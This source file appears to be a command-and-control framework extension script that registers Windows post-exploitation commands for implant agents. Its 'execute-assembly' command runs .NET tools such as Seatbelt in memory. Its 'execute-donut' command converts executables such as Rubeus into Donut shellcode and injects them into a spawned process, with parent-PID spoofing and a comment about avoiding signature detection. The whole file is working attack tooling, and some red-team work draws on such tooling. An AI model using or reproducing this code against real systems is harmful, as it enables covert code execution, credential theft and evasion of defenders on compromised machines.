var metadata = {
    name: "Execution-BOF",
    description: "BOFs for inline execution"
};

ax.script_import(ax.script_dir() + "No-Consolation/no_consolation.axs")

var cmd_execute_assembly = ax.create_command("execute-assembly", "Perform in process .NET assembly execution", "execute-assembly /opt/windows/Seatbelt.exe -group=user");
cmd_execute_assembly.addArgString("path", true, "Path to .NET assembly");
cmd_execute_assembly.addArgString("params", ".NET assembly parameters", "");
cmd_execute_assembly.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let assembly_content = ax.file_read(parsed_json["path"]);
    let assembly_params = parsed_json["params"];

    if (assembly_content.length == 0) {
        throw new Error(`file ${parsed_json["path"]} not readed`);
    }

    let bof_params = ax.bof_pack("bytes,cstr", [assembly_content, assembly_params]);
    let bof_path = ax.script_dir() + "_bin/execute-assembly." + ax.arch(id) + ".o";
    let message = "Task: execute .NET assembly " + ax.file_basename(parsed_json["path"]);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var cmd_execute_donut = ax.create_command("execute-donut", "Execute EXE using Donut and process injection", "execute-donut -P 1234 /tmp/Rubeus.exe triage");
cmd_execute_donut.addArgFlagInt("-P", "ppid", false, "PPID to spoof (default: 0, PPID spoofing enabled if set)");
cmd_execute_donut.addArgFlagString("-p", "spawn", false, "Program to spawn and inject into (default: notepad.exe)");
cmd_execute_donut.addArgFlagString("-a", "arch", false, "Architecture x86/x64 (default: x64)");
cmd_execute_donut.addArgString("path", true, "Path to local EXE/DLL (Required for execution)");
cmd_execute_donut.addArgString("params", false, "Arguments for the executable");

cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    // Parsing is now handled by the framework into parsed_json
    // Flags are mapped by their 'name' (2nd arg in addArgFlag*)

    var ppid = 0;
    if (parsed_json["ppid"]) ppid = parsed_json["ppid"];

    var spawn = "notepad.exe";
    if (parsed_json["spawn"]) spawn = parsed_json["spawn"];

    var arch = "x64";
    if (parsed_json["arch"]) arch = parsed_json["arch"];

    var exe_path = parsed_json["path"];
    var exe_args = parsed_json["params"] || "";

    // Default Donut Options
    var compress = 1; // 1=None, 2=aPLib
    var entropy = 3; // 3=Default (Random+Symmetric)
    var exit_opt = 2; // 1=Thread, 2=Process, 3=Block
    var bypass = 1; // 1=None (Donut default bypass is signatured a lot)
    var headers = 1; // 1=Overwrite

    // Adjust spawn for x86 if using default
    if (arch == "x86" && spawn == "notepad.exe") {
        spawn = "C:\\Windows\\SysWOW64\\notepad.exe";
    }

    var shellcode_b64 = "";
    var pipeName = "";
    var stubBase64 = "";

    // Generate Shellcode
    if (!exe_path || exe_path.length == 0) {
        ax.console_message(id, "Error", "error", "No executable path provided");
        return;
    }

    // Validate Architecture
    if (arch == "x86") {
        ax.console_message(id, "Error", "error", "x86 architecture is not supported currently.");
        return;
    }

    if (arch != "x86" && arch != "x64") {
        ax.console_message(id, "Error", "error", "Invalid architecture: " + arch + ". Must be x64 or x86.");
        return;
    }

    // Validate PPID
    if (isNaN(ppid)) {
        ax.console_message(id, "Error", "error", "Invalid PPID provided");
        return;
    }

    // Validate Architecture for Pipe Mode
    if (ppid > 0 && arch != "x64" && arch != "x86") {
        ax.console_message(id, "Error", "error", "Architecture must be x64 or x86 when using PPID spoofing");
        return;
    }

    // If PPID is specified, we need the pipe setup (PPID Mode)
    if (ppid > 0) {
        // Generate unique pipe name
        var timestamp = Date.now().toString(16).toUpperCase();
        pipeName = "\\\\.\\pipe\\dnt_" + timestamp.substring(timestamp.length - 8);

        // Read the architecture-specific stub
        stubBase64 = ax.file_read(ax.script_dir() + "execute-donut/pipe_shellcode/stub_" + arch + ".bin");
        if (stubBase64.length == 0) {
            ax.console_message(id, "Error", "error", "Failed to read redirect stub for " + arch);
            return;
        }
    }

    // Call unified donut_generate
    shellcode_b64 = ax.donut_generate(
        exe_path,
        exe_args,
        arch,
        pipeName,
        stubBase64,
        compress,
        entropy,
        exit_opt,
        bypass,
        headers
    );

    if (!shellcode_b64 || shellcode_b64.length == 0) {
        return;
    }

    // Pack: JobId(i), PPID(i), Spawn(s), PipeName(s), Shellcode(b)
    // Use a unique numeric ID for the job (using timestamp)
    var jobId = (Date.now() & 0xFFFFFFF); // Fit in positive int32

    var bof_params = ax.bof_pack("int,int,cstr,cstr,bytes", [jobId, ppid, spawn, pipeName, shellcode_b64]);
    var bof_path = ax.script_dir() + "_bin/execute-donut." + ax.arch(id) + ".o";
    var message = "Task: execute-donut " + ax.file_basename(exe_path);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var group_exec = ax.create_commands_group("Execution-BOF", [cmd_execute_assembly, cmd_no_consolation, cmd_execute_donut]);
ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
